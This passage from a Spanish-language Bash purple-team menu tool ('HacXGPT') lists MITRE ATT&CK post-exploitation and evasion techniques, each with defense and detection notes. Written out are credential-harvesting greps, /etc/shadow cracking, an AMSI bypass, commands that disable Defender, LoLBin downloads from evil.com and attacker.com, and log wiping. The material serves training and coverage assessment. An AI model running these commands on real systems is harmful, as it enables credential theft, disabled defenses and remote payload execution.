                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • Event ID 4661: muchas consultas LDAP desde una cuenta en poco tiempo"
                echo "  • NetFlow: consultas SMB masivas a muchos hosts = lateral discovery"
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

post_explotacion_linux() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║       ${YELLOW}🐧 POST-EXPLOTACIÓN — LINUX${NC}              ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1552.003 — Credentials in Bash History"
        echo "2. T1552.002 — Credentials in Files (config files)"
        echo "3. T1552.004 — Private SSH Keys"
        echo "4. T1548.003 — Sudo Token Impersonation"
        echo "5. T1003.008 — /etc/passwd y /etc/shadow"
        echo "6. T1083 — Enumeración de directories sensibles"
        echo "7. Volver"
        echo ""
        read -p "💣 Selecciona [1-7]: " op
        case $op in
            1)
                echo -e "${RED}🔴 T1552.003 — Bash History:${NC}"
                echo "  • cat ~/.bash_history"
                echo "  • grep -i 'pass\|secret\|key\|token\|aws\|api' ~/.bash_history"
                echo "  • find / -name '.bash_history' 2>/dev/null | xargs grep -l 'pass'"
                echo "  • history | grep -i 'mysql\|psql\|ssh.*@\|curl.*-u'"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  HISTCONTROL=ignorespace | HISTFILE=/dev/null"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd regla: -a always,exit -F path=~/.bash_history"
                ;;
            2)
                echo -e "${RED}🔴 T1552.002 — Credentials in Files:${NC}"
                echo "  • grep -rn 'password\|passwd\|secret\|token' /etc/ 2>/dev/null"
                echo "  • find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null"
                echo "  • cat /etc/mysql/debian.cnf  (contiene creds MySQL)"
                echo "  • find / -name '*.conf' -exec grep -l 'password' {} \\;"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  Vault/secrets manager, permisos 600 en config files"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  inotifywait en archivos sensibles, auditd"
                ;;
            3)
                echo -e "${RED}🔴 T1552.004 — Private SSH Keys:${NC}"
                echo "  • find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"
                echo "  • locate .ssh/id_rsa"
                echo "  • cat ~/.ssh/authorized_keys  (ver a qué hosts tenemos acceso)"
                echo "  • ssh-keygen -y -f id_rsa  (extraer clave pública para verificar)"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  SSH keys protegidas con passphrase + ssh-agent"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: acceso a archivos .ssh/ fuera del owner"
                ;;
            4)
                echo -e "${RED}🔴 T1548.003 — Sudo Token Impersonation:${NC}"
                echo "  • sudo -l  (ver qué puede correr el usuario actual con sudo)"
                echo "  • cat /etc/sudoers  (si tenemos acceso)"
                echo "  • sudo -u otro_usuario /bin/bash  (si hay NOPASSWD)"
                echo "  • Técnica prctrace: usar mismo sudo token de otro proceso"
                echo "    pt-copy-sudo-token [PID_of_sudo_session]"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  timestamp_timeout=0 en sudoers, PAM lockout"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  Event sudo: nuevas sesiones con usuario diferente"
                ;;
            5)
                echo -e "${RED}🔴 T1003.008 — /etc/passwd & /etc/shadow:${NC}"
                echo "  • cat /etc/passwd  (hashes si no hay shadow)"
                echo "  • cat /etc/shadow  (si eres root)"
                echo "  • unshadow /etc/passwd /etc/shadow > combined.txt"
                echo "  • john --wordlist=rockyou.txt combined.txt"
                echo "  • hashcat -m 1800 combined.txt rockyou.txt  (sha-512crypt)"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  PAM: lock after 5 fails, shadow perms 640"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: -w /etc/shadow -p rwa"
                ;;
            6)
                echo -e "${RED}🔴 T1083 — File & Directory Discovery:${NC}"
                echo "  • find / -perm -4000 2>/dev/null    (SUID binaries)"
                echo "  • find / -writable -type f 2>/dev/null | grep -v proc"
                echo "  • ls -la /home/*/.ssh/"
                echo "  • find /var/www -name '*.php' | xargs grep 'password'"
                echo "  • ls /opt /srv /data /backup 2>/dev/null"
                echo -e "${BLUE}🔵 DEFENSA:${NC}  Auditoría de SUID binaries, permisos mínimos"
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: find y locate agresivos en filesystem"
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

evasion_defensas() {
    while true; do
        show_banner
        echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${RED}🕵️  EVASIÓN DE DEFENSAS${NC}                  ${YELLOW}║${NC}"
        echo -e "${YELLOW}║     ${CYAN}Defense Evasion — TA0005 MITRE${NC}            ${YELLOW}║${NC}"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1027.010 — Ofuscación de comandos (PowerShell)"
        echo "2. T1055     — Process Injection (DLL / Shellcode)"
        echo "3. T1562.001 — Deshabilitar AV/EDR"
        echo "4. T1218     — LoLBins (Living Off The Land Binaries)"
        echo "5. T1070.004 — Indicador Removal: Borrar Logs"
        echo "6. T1036     — Masquerading (Suplantación de procesos)"
        echo "7. Volver"
        echo ""
        read -p "🕵️  Selecciona [1-7]: " op
        case $op in
            1)
                echo -e "${YELLOW}╔══ T1027.010 — Ofuscación de PowerShell ══╗${NC}"
                echo -e "${RED}🔴 TÉCNICAS:${NC}"
                echo "  • Base64 encode: powershell -enc [base64]"
                echo "  • Invoke-Obfuscation: Token\\All\\1 (scramble tokens)"
                echo "  • AMSI Bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)"
                echo "  • String concatenation: \$c='I'+'EX'; &(\$c) payload"
                echo "  • Chameleon PowerShell: ofusca automáticamente scripts"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • PowerShell Script Block Logging (Event 4104) → decodifica el payload"
                echo "  • AMSI: intercepta antes de ejecutar incluso código decodificado"
                echo "  • Buscar -enc, IEX, DownloadString, base64 en logs de PowerShell"
                ;;
            2)
                echo -e "${YELLOW}╔══ T1055 — Process Injection ══════════════╗${NC}"
                echo -e "${RED}🔴 TÉCNICAS:${NC}"
                echo "  • Classic DLL Injection: CreateRemoteThread + LoadLibrary"
                echo "  • Shellcode: VirtualAllocEx→WriteProcessMemory→CreateRemoteThread"
                echo "  • Process Hollowing: SpawnProcess suspended → Replace code"
                echo "  • Reflective DLL: dll cargada en memoria sin tocar disco"
                echo "  • DCOM/COM Injection: usar objetos COM para ejecutar código"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • Sysmon Event 8: CreateRemoteThread"
                echo "  • Sysmon Event 25: ProcessTampering (Process Hollowing)"
                echo "  • Memoria RWX en proceso legítimo sin mapear a fichero"
                echo "  • EDR: comportamiento anómalo en proceso → código en heap"
                ;;
            3)
                echo -e "${YELLOW}╔══ T1562.001 — Disable AV/EDR ════════════╗${NC}"
                echo -e "${RED}🔴 TÉCNICAS:${NC}"
                echo "  • Set-MpPreference -DisableRealtimeMonitoring \$true"
                echo "  • sc stop WinDefend && sc config WinDefend start=disabled"
                echo "  • BYOVD: traer driver vulnerable para kill EDR desde kernel"
                echo "    (Ejemplo: Gigabyte driver CVE-2018-19320)"
                echo "  • wmic path MSFT_MpPreference call Add ExclusionPath='C:\\temp'"
                echo "  • taskkill /F /IM MsMpEng.exe (requiere SYSTEM)"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • Tamper Protection (Microsoft Defender) → bloquea cambios"
                echo "  • Event ID 7036: servicio WinDefend detenido → alerta inmediata"
                echo "  • EDR heartbeat: si agente deja de reportar → alerta"
                echo "  • Alertar drivers cargados no firmados por Microsoft"
                ;;
            4)
                echo -e "${YELLOW}╔══ T1218 — Living Off The Land Binaries ══╗${NC}"
                echo -e "${RED}🔴 LOLBINS más usados:${NC}"
                echo "  • certutil.exe: descargar ficheros remotos:"
                echo "    certutil -urlcache -split -f http://evil.com/shell.exe shell.exe"
                echo "  • mshta.exe: ejecutar código VBScript/JScript remoto:"
                echo "    mshta.exe http://attacker.com/payload.hta"
                echo "  • regsvr32.exe: CargarDLL/COM sin previo registro:"
                echo "    regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
                echo "  • wscript.exe / cscript.exe: ejecutar JS/VBS malicioso"
                echo "  • rundll32.exe: ejecutar función en DLL arbitraria"
                echo "  • msiexec.exe: instalar MSI remoto: msiexec /q /i http://evil.com/x.msi"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • WDAC / AppLocker: bloquear certutil para descargas"
                echo "  • Alertar en: certutil -urlcache, mshta con URL, regsvr32 /i:http"
                echo "  • Sysmon ID 1: argumento de red en procesos 'legítimos'"
                ;;
            5)
                echo -e "${YELLOW}╔══ T1070.004 — Indicator Removal: Log Wipe ╗${NC}"
                echo -e "${RED}🔴 TÉCNICAS:${NC}"
                echo "  • Windows: wevtutil cl Security; wevtutil cl System; wevtutil cl Application"
                echo "  • PowerShell: Clear-EventLog -LogName Security,System"
                echo "  • Linux: > /var/log/auth.log; history -c; shred -u ~/.bash_history"
                echo "  • Sysmon: sc stop Sysmon (si no está protegido)"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • Event ID 1102: Audit log cleared → alerta inmediata"
                echo "  • Event ID 7036: Sysmon detenido"
                echo "  • SIEM externo: si deja de recibir logs del host → alerta"
                echo "  • WORM logs: escribir en repositorio externo inmutable"
                ;;
            6)
                echo -e "${YELLOW}╔══ T1036 — Masquerading ══════════════════╗${NC}"
                echo -e "${RED}🔴 TÉCNICAS:${NC}"
                echo "  • Renombrar malware como svchost.exe, explorer.exe"
                echo "  • Poner malware en C:\\Windows\\System32\\ (requiere SYSTEM)"
                echo "  • Unicode homoglifos: svсhost.exe (с cirílico vs c latino)"
                echo "  • DLL Side-Loading: colocar DLL maliciosa junto a app legítima"
                echo ""
                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
                echo "  • Verificar firma digital de todos los ejecutables en System32"
                echo "  • Sysmon ID 1: path de proceso vs. path esperado del ejecutable"
                echo "  • Alertar en: procesos que se llaman svchost.exe fuera de System32"
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

menu_post_explotacion() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║           ${YELLOW}💣 MENÚ POST-EXPLOTACIÓN${NC}             ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${YELLOW}1.${NC} Post-Explotación Windows (Mimikatz, Kerberoasting...)"
        echo -e "  ${YELLOW}2.${NC} Post-Explotación Linux (Bash history, SSH keys...)"
        echo -e "  ${YELLOW}3.${NC} Evasión de Defensas (LoLBins, Obfuscation, AV Bypass)"
        echo -e "  ${RED}0.${NC} Volver"
        echo ""
        read -p "💣 Selecciona [0-3]: " op
        case $op in
            1) post_explotacion_windows ;;
            2) post_explotacion_linux ;;
            3) evasion_defensas ;;
            0) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
    done
}

# ============================================================
# 12. SIMULACIÓN DE ACTORES DE AMENAZA (APT)
# ============================================================
simular_apt() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║      ${RED}🕵️  SIMULACIÓN DE ACTOR DE AMENAZA${NC}          ${CYAN}║${NC}"
        echo -e "${CYAN}║       ${YELLOW}APT29 · APT38 · FIN7 · Personalizado${NC}     ${CYAN}║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${YELLOW}1.${NC} ${RED}APT29${NC} (Cozy Bear) 🇷🇺  — Espionaje SVR Ruso"
        echo -e "  ${YELLOW}2.${NC} ${RED}APT38${NC} (Lazarus)   🇰🇵 — Financiero RPDC"
        echo -e "  ${YELLOW}3.${NC} ${RED}FIN7${NC}  (Carbanak)   💰  — Criminal Financiero"
        echo -e "  ${YELLOW}4.${NC} ${BLUE}Personalizado${NC}       🎯  — Define tus técnicas"
        echo -e "  ${RED}0.${NC} Volver"
        echo ""
        read -p "🕵️  Selecciona APT [0-4]: " sel

        case $sel in
            1) _show_apt "APT29" ;;
            2) _show_apt "APT38" ;;
            3) _show_apt "FIN7" ;;
            4) _apt_personalizado ;;
            0) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

_show_apt() {
    local apt="$1"
    local info="${APT_INFO[$apt]}"
    local tecnicas="${APT_TECNICAS[$apt]}"
    local killchain="${APT_KILLCHAIN[$apt]}"

    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ${CYAN}🕵️  PERFIL: $apt${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    IFS='|' read -ra info_parts <<< "$info"
    echo -e "  ${YELLOW}Alias:${NC}       ${info_parts[0]}"
    echo -e "  ${YELLOW}Atribución:${NC}  ${info_parts[1]}"
    echo -e "  ${YELLOW}Motivación:${NC}  ${info_parts[2]}"
    echo -e "  ${YELLOW}Objetivo:${NC}    ${info_parts[3]}"
    echo ""
    echo -e "${PURPLE}══ KILL CHAIN ════════════════════════════════════${NC}"
    IFS='|' read -ra pasos <<< "$killchain"
    for paso in "${pasos[@]}"; do
        echo -e "  ${GREEN}➤${NC} $paso"
    done
    echo ""
    echo -e "${CYAN}══ TÉCNICAS MITRE ATT&CK ════════════════════════${NC}"
    IFS='|' read -ra tecs <<< "$tecnicas"
    for tec in "${tecs[@]}"; do
        local tid="${tec%%:*}"
        local tnom="${tec##*:}"
        printf "  ${YELLOW}%-14s${NC} %s\n" "$tid" "$tnom"
    done
    echo ""
    echo -e "${YELLOW}══ EVALUACIÓN DE COBERTURA ══════════════════════${NC}"
    echo -e "  ¿Tienes defensa contra estas técnicas?"
    echo ""
    IFS='|' read -ra tecs2 <<< "$tecnicas"
    local cubierto=0
    local total=${#tecs2[@]}
    for tec in "${tecs2[@]}"; do
        local tid="${tec%%:*}"
        read -p "  ¿Detectarías/mitigarías ${CYAN}$tid${NC}? [s/n]: " resp
        if [[ "${resp,,}" == "s" ]]; then
            echo -e "    ${GREEN}✅ Cubierta${NC}"
            ((cubierto++))
        else
            echo -e "    ${RED}❌ BRECHA detectada → revisar controles${NC}"
        fi
    done
    echo ""
    local pct=$(( cubierto * 100 / total ))
    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total técnicas (${YELLOW}$pct%${NC})"
    if (( pct >= 70 )); then
        echo -e "  ${GREEN}✅ Postura defensiva BUENA frente a $apt${NC}"
    elif (( pct >= 40 )); then
        echo -e "  ${YELLOW}⚠️  Postura MEJORABLE — brechas significativas${NC}"
    else
        echo -e "  ${RED}🚨 Postura CRÍTICA — expuesto a $apt${NC}"
    fi
    save_output "[$apt SIMULACION] Cobertura: $cubierto/$total ($pct%)"
}

_apt_personalizado() {
    echo ""
    echo -e "${BLUE}╔══ APT PERSONALIZADO ═══════════════════════════╗${NC}"
    echo -e "  Ingresa los IDs de técnicas MITRE separadas por coma"
    echo -e "  Ejemplo: ${YELLOW}T1566,T1059,T1078,T1003${NC}"
    echo ""
    read -p "🎯 Tus técnicas: " custom_input

    IFS=',' read -ra custom_tecs <<< "$custom_input"
    local cubierto=0
    local total=${#custom_tecs[@]}

    echo ""
    echo -e "${YELLOW}══ EVALUACIÓN PERSONALIZADA ══════════════════════${NC}"
    for tid in "${custom_tecs[@]}"; do
        tid="${tid// /}"
        local pdata="${PURPLE_DATA[${tid^^}]}"
        echo ""
        echo -e "  ${CYAN}Técnica: ${tid^^}${NC}"
        if [[ -n "$pdata" ]]; then
            # Mostrar solo línea de ataque
            echo "$pdata" | grep -A2 "ATAQUE" | head -4 | sed 's/^/  /'
        fi
        read -p "  ¿Detectarías/mitigarías esta técnica? [s/n]: " resp
        if [[ "${resp,,}" == "s" ]]; then
            echo -e "    ${GREEN}✅ Cubierta${NC}"
            ((cubierto++))
        else
            echo -e "    ${RED}❌ BRECHA — revisa controles${NC}"
        fi
    done

    echo ""
    local pct=0
    (( total > 0 )) && pct=$(( cubierto * 100 / total ))
    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total (${YELLOW}$pct%${NC})"
    save_output "[APT_CUSTOM] Cobertura: $cubierto/$total ($pct%)"
}

# ============================================================
# 13. GAP ANALYSIS — HEAT MAP MITRE ATT&CK
# ============================================================
analizar_brechas() {
    show_banner
    echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║      ${CYAN}📈 GAP ANALYSIS — HEAT MAP MITRE${NC}           ${GREEN}║${NC}"
    echo -e "${GREEN}║  ${YELLOW}✅ Probada+Mitigada  🟡 Sin mitigar  ❌ No probada${NC} ${GREEN}║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Ingresa técnicas probadas separadas por coma${NC}"
    echo -e "${BLUE}Ejemplo: T1566,T1059,T1003,T1078${NC}"
    echo ""
    read -p "✅ Técnicas probadas Y mitigadas: " input_verde
    read -p "🟡 Técnicas probadas SIN mitigación: " input_amarillo
    echo ""

    # Normalizar inputs
    declare -A probadas_verde
    declare -A probadas_amarillo
    IFS=',' read -ra v_arr <<< "$input_verde"
    for t in "${v_arr[@]}"; do
        t="${t// /}"
        [[ -n "$t" ]] && probadas_verde["${t^^}"]=1
    done
    IFS=',' read -ra a_arr <<< "$input_amarillo"
    for t in "${a_arr[@]}"; do
        t="${t// /}"
        [[ -n "$t" ]] && probadas_amarillo["${t^^}"]=1
    done

    # Definir técnicas representativas por táctica (4 por táctica)
    declare -A HEAT_TECNICAS
    HEAT_TECNICAS["TA0043"]="T1595 T1592 T1589 T1598"
    HEAT_TECNICAS["TA0042"]="T1583 T1584 T1608 T1587"
    HEAT_TECNICAS["TA0001"]="T1566 T1190 T1133 T1078"
    HEAT_TECNICAS["TA0002"]="T1059 T1053 T1204 T1047"
    HEAT_TECNICAS["TA0003"]="T1547 T1505 T1136 T1078"
    HEAT_TECNICAS["TA0004"]="T1548 T1134 T1068 T1055"
    HEAT_TECNICAS["TA0005"]="T1027 T1055 T1562 T1218"
    HEAT_TECNICAS["TA0006"]="T1003 T1558 T1555 T1056"
    HEAT_TECNICAS["TA0007"]="T1082 T1083 T1057 T1018"
    HEAT_TECNICAS["TA0008"]="T1021 T1550 T1080 T1563"
    HEAT_TECNICAS["TA0009"]="T1114 T1005 T1039 T1113"
    HEAT_TECNICAS["TA0011"]="T1071 T1095 T1572 T1090"
    HEAT_TECNICAS["TA0010"]="T1048 T1041 T1567 T1020"
    HEAT_TECNICAS["TA0040"]="T1485 T1486 T1490 T1498"

    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}       🗺️  HEAT MAP — MITRE ATT&CK Enterprise${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    local total_tecs=0
    local total_verde=0
    local total_amarillo=0

    for tid in "${MITRE_ORDEN[@]}"; do
        local tactica_short="${MITRE_TACTICAS[$tid]}"
        # Primera parte antes del |
        local emoji="${tactica_short%%|*}"
        printf "  ${CYAN}%-40s${NC}" "$emoji"
        local tecs="${HEAT_TECNICAS[$tid]}"
        for tec in $tecs; do
            ((total_tecs++))
            if [[ "${probadas_verde[$tec]+_}" ]]; then
                printf "${GREEN}✅%-7s${NC}" "$tec"
                ((total_verde++))
            elif [[ "${probadas_amarillo[$tec]+_}" ]]; then
                printf "${YELLOW}🟡%-7s${NC}" "$tec"
                ((total_amarillo++))
            else
                printf "${RED}❌%-7s${NC}" "$tec"
            fi
        done
        echo ""
    done

    local total_cubierto=$(( total_verde + total_amarillo ))
    local pct=0
    (( total_tecs > 0 )) && pct=$(( total_cubierto * 100 / total_tecs ))

    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${GREEN}✅ Probadas+Mitigadas:${NC} $total_verde"
    echo -e "  ${YELLOW}🟡 Probadas sin mitigación:${NC} $total_amarillo"
    echo -e "  ${RED}❌ No probadas:${NC} $(( total_tecs - total_cubierto ))"
    echo -e "  ${CYAN}📊 Cobertura total: ${YELLOW}$total_cubierto / $total_tecs (${pct}%)${NC}"
    echo ""
    if (( pct >= 60 )); then
        echo -e "  ${GREEN}✅ Postura de seguridad BUENA${NC}"
    elif (( pct >= 30 )); then
        echo -e "  ${YELLOW}⚠️  Postura MEJORABLE — muchas técnicas sin cubrir${NC}"
    else
        echo -e "  ${RED}🚨 Postura CRÍTICA — revisar controles urgente${NC}"
    fi
    echo ""
    save_output "[GAP ANALYSIS] Cobertura: $total_cubierto/$total_tecs ($pct%)"
    read -p "↵ Enter para continuar..." _
}

# ============================================================
# MENÚ PRINCIPAL
# ============================================================
while true; do
    show_banner

    echo -e "${GREEN}🛡️  1. ${NC} Reconocimiento Básico"
    echo -e "${GREEN}🌐  2. ${NC} Escaneo Web"
    echo -e "${GREEN}📡  3. ${NC} Análisis de Red"
    echo -e "${GREEN}⚔️   4. ${NC} Suite de Pentesting"
    echo -e "${GREEN}📊  5. ${NC} Generar Reportes"
    echo -e "${GREEN}🔧  6. ${NC} Herramientas Avanzadas"
    echo -e "${CYAN}💬  7. ${NC} Chat Libre Técnico"
    echo -e "${CYAN}🔍  8. ${NC} Escaneo Sigiloso"
    echo -e "${PURPLE}━━━━━━━━━━━━━━ MODO EXPERTO ━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}🎯  9. ${NC} Matriz MITRE ATT&CK ${CYAN}(14 tácticas)${NC}"
    echo -e "${PURPLE}🟣 10. ${NC} Modo Purple Team ${RED}(Red${NC}+${BLUE}Blue${NC}+${PURPLE}Detect)${NC}"
    echo -e "${RED}💣 11. ${NC} Post-Explotación ${YELLOW}(Win+Linux+Evasión)${NC}"
    echo -e "${CYAN}🕵️  12. ${NC} Simulación de APT ${YELLOW}(APT29·APT38·FIN7)${NC}"
    echo -e "${GREEN}📈 13. ${NC} Gap Analysis ${CYAN}/ Heat Map MITRE${NC}"
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}🎯 Objetivo: ${TARGET:-${RED}No definido${NC}}${NC}"
    echo -e "  ${BLUE}C.${NC}  Cambiar objetivo"
    if [[ "$SAVE_MODE" == true ]]; then
        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${GREEN}[ACTIVO → $OUTPUT_FILE]${NC}"
    else
        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${RED}[INACTIVO]${NC}"
    fi
    echo -e "${RED}❌  0. ${NC} Salir"
    echo ""

    read -p "🎯 Selecciona opción [0-13, C, S]: " main_opcion

    case $main_opcion in
        1) reconocimiento_basico ;;
        2) escaneo_web ;;
        3) analisis_red ;;
        4) suite_pentesting ;;
        5) generar_reportes ;;
        6) herramientas_avanzadas ;;
        7) chat_libre ;;
        8) escaneo_sigiloso ;;
        9) mitre_menu ;;
        10) modo_purple_team ;;
        11) menu_post_explotacion ;;
        12) simular_apt ;;
        13) analizar_brechas ;;
        [Cc]) preguntar_objetivo ;;
        [Ss])
            if [[ "$SAVE_MODE" == false ]]; then
                SAVE_MODE=true
                echo ""
                echo -e "${GREEN}✅ Guardado ACTIVADO → ${OUTPUT_FILE}${NC}"
            else
                SAVE_MODE=false
                echo ""
                echo -e "${YELLOW}⏹️  Guardado DESACTIVADO${NC}"
            fi
            sleep 1
            ;;
        0)
            show_banner
            echo ""
            echo -e "${GREEN}            ¡HASTA PRONTO! ${NC}"
            echo -e "${BLUE}    Gracias por usar HacXGPT v8.0 EXPERTO ${NC}"
            echo -e "${PURPLE}       MITRE ATT&CK Framework Edition ${NC}"
            echo ""
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo -e "${RED}❌ Opción no válida${NC}"
            sleep 1
            ;;
    esac
done
